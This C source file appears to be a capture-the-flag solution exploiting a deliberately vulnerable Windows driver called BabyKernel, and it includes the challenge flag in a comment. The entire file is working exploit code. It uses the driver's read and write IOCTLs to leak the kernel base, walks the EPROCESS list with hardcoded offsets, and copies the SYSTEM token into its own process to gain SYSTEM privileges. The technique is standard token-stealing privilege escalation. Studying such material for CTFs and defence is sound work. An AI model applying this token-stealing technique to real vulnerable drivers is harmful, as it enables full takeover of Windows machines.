#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>

static const int SystemModuleInformation = 11;
static const NTSTATUS STATUS_INFO_LENGTH_MISMATCH = 0xc0000004;
static const size_t AbsPsInitialSystemProcess = 0x140CFC420 - 0x140000000;

typedef struct _SYSTEM_MODULE_ENTRY {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
  ULONG Count;
  SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

static const size_t OffsetOfEPROCESSProcessListEntry = 0x350;
static const size_t OffsetOfEPROCESSUniqueProcessId = 0x440;
static const size_t OffsetOfEPROCESSToken = 0x4b8;
static const size_t OffsetOfEPROCESSImageFileName = 0x5a8;

static HANDLE OpenDevice(void) {
  HANDLE hDevice = CreateFile(
      /* lpFileName */ "\\\\.\\BabyKernel",
      /* dwDesiredAccess */ GENERIC_READ | GENERIC_WRITE,
      /* dwShareMode */ 0,
      /* lpSecurityAttributes */ NULL,
      /* dwCreationDisposition */ OPEN_EXISTING,
      /* dwFlagsAndAttributes */ FILE_ATTRIBUTE_NORMAL,
      /* hTemplateFile */ NULL);
  assert(hDevice != INVALID_HANDLE_VALUE);
  return hDevice;
}

typedef struct {
  size_t Size;
  void *UserspaceBuf;
  void *KernelBuf;
} BABYKERNEL_IOREQ;
static_assert(sizeof(BABYKERNEL_IOREQ) == 0x18);

static void CopyToUser(HANDLE hDevice, void *UserspaceBuf, void *KernelBuf,
                       size_t Size) {
  BABYKERNEL_IOREQ Req = {
      .Size = Size, .UserspaceBuf = UserspaceBuf, .KernelBuf = KernelBuf};
  BOOL bOk = DeviceIoControl(
      /* hDevice */ hDevice,
      /* dwIoControlCode */ 0x220004,
      /* lpInBuffer */ &Req,
      /* nInBufferSize */ sizeof(Req),
      /* lpOutBuffer */ NULL,
      /* nOutBufferSize */ 0,
      /* lpBytesReturned */ NULL,
      /* lpOverlapped */ NULL);
  assert(bOk);
}

static void CopyFromUser(HANDLE hDevice, void *KernelBuf, void *UserspaceBuf,
                         size_t Size) {
  BABYKERNEL_IOREQ Req = {
      .Size = Size, .UserspaceBuf = UserspaceBuf, .KernelBuf = KernelBuf};
  BOOL bOk = DeviceIoControl(
      /* hDevice */ hDevice,
      /* dwIoControlCode */ 0x220008,
      /* lpInBuffer */ &Req,
      /* nInBufferSize */ sizeof(Req),
      /* lpOutBuffer */ NULL,
      /* nOutBufferSize */ 0,
      /* lpBytesReturned */ NULL,
      /* lpOverlapped */ NULL);
  assert(bOk);
}

static PVOID GetNtoskrnl(void) {
  ULONG miLength;
  NTSTATUS ntStatus = NtQuerySystemInformation(
      /* SystemInformationClass */ SystemModuleInformation,
      /* SystemInformation */ NULL,
      /* SystemInformationLength */ 0,
      /* ReturnLength */ &miLength);
  assert(ntStatus == STATUS_INFO_LENGTH_MISMATCH);
  PSYSTEM_MODULE_INFORMATION mi = malloc(miLength);
  assert(mi != NULL);
  ntStatus = NtQuerySystemInformation(
      /* SystemInformationClass */ SystemModuleInformation,
      /* SystemInformation */ mi,
      /* SystemInformationLength */ miLength,
      /* ReturnLength */ NULL);
  assert(NT_SUCCESS(ntStatus));
  assert(strcmp((char *)(mi->Module[0].FullPathName +
                         mi->Module[0].OffsetToFileName),
                "ntoskrnl.exe") == 0);
  return mi->Module[0].ImageBase;
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);

  PVOID ntoskrnl = GetNtoskrnl();
  printf("ntoskrnl = %p\n", ntoskrnl);

  HANDLE hDevice = OpenDevice();
  void *PsInitialSystemProcess;
  CopyToUser(hDevice, &PsInitialSystemProcess,
             ntoskrnl + AbsPsInitialSystemProcess,
             sizeof(PsInitialSystemProcess));
  printf("PsInitialSystemProcess = %p\n", PsInitialSystemProcess);

  void *Token;
  CopyToUser(hDevice, &Token, PsInitialSystemProcess + OffsetOfEPROCESSToken,
             sizeof(Token));
  printf("Token = %p\n", Token);

  void *Process = PsInitialSystemProcess;
  do {
    unsigned __int64 Pid = 0;
    CopyToUser(hDevice, &Pid, Process + OffsetOfEPROCESSUniqueProcessId,
               sizeof(Pid));
    char Image[16] = {};
    CopyToUser(hDevice, Image, Process + OffsetOfEPROCESSImageFileName,
               sizeof(Image) - 1);
    printf("Process = %p %d %s\n", Process, (int)Pid, Image);

    if (Pid == GetCurrentProcessId()) {
      CopyFromUser(hDevice, Process + OffsetOfEPROCESSToken, &Token,
                   sizeof(Token));
      printf("ok\n");
      /* midnight{w0ah_gu355_yoU_Kn0w_youR_0ffSETS} */
      system("type C:\\Windows\\System32\\flag.txt");
      break;
    }

    void *ListEntry;
    CopyToUser(hDevice, &ListEntry, Process + OffsetOfEPROCESSProcessListEntry,
               sizeof(ListEntry));
    Process = ListEntry - OffsetOfEPROCESSProcessListEntry;
  } while (Process != PsInitialSystemProcess);

  return EXIT_SUCCESS;
}